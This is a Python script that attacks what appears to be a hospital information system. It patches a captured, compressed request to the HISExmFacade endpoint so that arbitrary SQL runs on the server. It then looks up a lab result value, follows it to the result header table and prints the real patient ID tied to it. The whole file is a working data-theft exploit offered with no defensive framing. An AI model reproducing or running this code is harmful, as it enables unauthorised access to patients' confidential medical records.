from his_client_final import HISClient
import requests
import zlib
import re

class TrxHunter(HISClient):
    def execute_sql(self, sql):
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = TrxHunter()

# Value to search: 7.94 (WBC)
val = '7.94'
print(f"Fetching full row for PRD_RESULT_VALUE = '{val}' in OPDUSR.PAT_RESULTD...")

sql = f"SELECT * FROM OPDUSR.PAT_RESULTD WHERE PRD_RESULT_VALUE = '{val}' AND ROWNUM <= 1"
res = hunter.execute_sql(sql)

if res and "<NewDataSet>" in res:
    print("!!! FOUND ROW !!!")
    print(res[:2000])
    
    # Extract TRX_NUM
    trx = re.findall(r'<PRD_TRX_NUM>(.*?)</PRD_TRX_NUM>', res)
    if trx:
        target_trx = trx[0]
        print(f"\nFound TRX_NUM: {target_trx}")
        
        # Now query Header
        print(f"Querying Header for TRX_NUM {target_trx}...")
        sql_head = f"SELECT * FROM OPDUSR.PAT_RESULTH WHERE PRH_TRX_NUM = '{target_trx}'"
        res_head = hunter.execute_sql(sql_head)
        if res_head and "<NewDataSet>" in res_head:
             print("!!! FOUND HEADER !!!")
             print(res_head[:2000])
             
             # Extract Patient ID from Header
             ids = re.findall(r'<PRH_PAT_ID>(.*?)</PRH_PAT_ID>', res_head)
             print(f"\nREAL PATIENT ID USED: {ids}")
        else:
             print("[-] Header query returned no data.")
else:
    print("[-] No data found for value.")
